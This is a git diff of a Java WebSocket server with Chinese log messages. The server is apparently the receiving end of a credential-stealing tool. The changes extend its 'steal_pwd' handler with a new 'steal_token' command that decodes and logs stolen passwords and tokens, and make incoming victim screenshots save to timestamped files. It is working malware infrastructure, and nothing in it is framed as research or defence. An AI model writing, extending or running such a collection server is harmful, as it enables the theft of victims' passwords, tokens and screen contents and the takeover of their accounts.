@@ -9,13 +9,15 @@ import org.slf4j.LoggerFactory;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.net.InetSocketAddress;
+import java.time.LocalTime;
+import java.time.format.DateTimeFormatter;
 import java.util.Arrays;
 import java.util.Base64;
 
 public class Server extends WebSocketServer {
 
-    public static final Logger LOGGER = LoggerFactory.getLogger("Server");
-    private static final File FILE = new File("screenshot.png");
+    public static final Logger LOGGER = LoggerFactory.getLogger(Server.class);
+
     private static int clientIndex = 0;
 
     public Server(int port) {
@@ -27,30 +29,47 @@ public class Server extends WebSocketServer {
         return new String(result);
     }
 
+    private static String[] doStringParse(String[] msgArr) throws IllegalArgumentException {
+        if (msgArr.length < 2) throw new IllegalArgumentException();
+        String[] msgArr_ = decodeBase64(msgArr[1]).split(" ");
+        String[] strArr = new String[msgArr_.length - 1];
+        for (int index = 0; index < strArr.length; index++) {
+            strArr[index] = decodeBase64(msgArr_[index + 1]);
+        }
+        return strArr;
+    }
+
+    public void log(String string) {
+        LOGGER.info("{}: {}", LocalTime.now().format(DateTimeFormatter.ofPattern("hh:mm:ss")), string);
+    }
+
     @Override
     public void onOpen(WebSocket conn, ClientHandshake handshake) {
         conn.setAttachment(clientIndex);
+        clientIndex++;
         int cIndex = conn.<Integer>getAttachment();
-        String addr = conn.getRemoteSocketAddress().getAddress().getHostAddress();
-        LOGGER.info("客户端连接: " + addr + " ID: " + cIndex);
+        String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
+        log("客户端连接: " + address + " ID: " + cIndex);
     }
 
     @Override
     public void onClose(WebSocket conn, int code, String reason, boolean remote) {
         int cIndex = conn.<Integer>getAttachment();
-        LOGGER.info("客户端已断开: ID: " + cIndex);
+        log("客户端已断开: ID: " + cIndex);
     }
 
     @Override
     public void onMessage(WebSocket conn, String message) {
         int cIndex = conn.<Integer>getAttachment();
         String[] msgArr = message.split(" ");
-        LOGGER.info("收到消息: " + msgArr[0] + " " + cIndex);
+        log("* 收到消息: " + msgArr[0] + " From ID " + cIndex);
         switch (msgArr[0]) {
             case "screenshot":
                 try {
-                    FILE.createNewFile();
-                    FileOutputStream file = new FileOutputStream(FILE);
+                    File filename = new File("screenshots", LocalTime.now().format(DateTimeFormatter.ofPattern("hh-mm-ss")) + ".png");
+                    new File("screenshots").mkdir();
+                    filename.createNewFile();
+                    FileOutputStream file = new FileOutputStream(filename);
                     file.write(Base64.getDecoder().decode(msgArr[1]));
                     file.close();
                     return;
@@ -59,18 +78,20 @@ public class Server extends WebSocketServer {
                 }
                 break;
             case "steal_pwd":
-                if (msgArr.length < 3) break;
-                String[] strArr = new String[msgArr.length - 2];
-                for (int index = 0; index < strArr.length; index++) {
-                    strArr[index] = decodeBase64(msgArr[index + 2]);
-                }
-                LOGGER.info("消息: " + msgArr[0] + " " + Arrays.toString(strArr));
-            default:
+            case "steal_token":
                 try {
-                    LOGGER.info("消息: " + msgArr[0] + " " + decodeBase64(msgArr[1]));
+                    log("消息: " + msgArr[0] + " " + Arrays.toString(doStringParse(msgArr)));
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
+                break;
+            default:
+                try {
+                    log("消息: " + msgArr[0] + " " + decodeBase64(msgArr[1]));
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+                break;
         }
     }
 
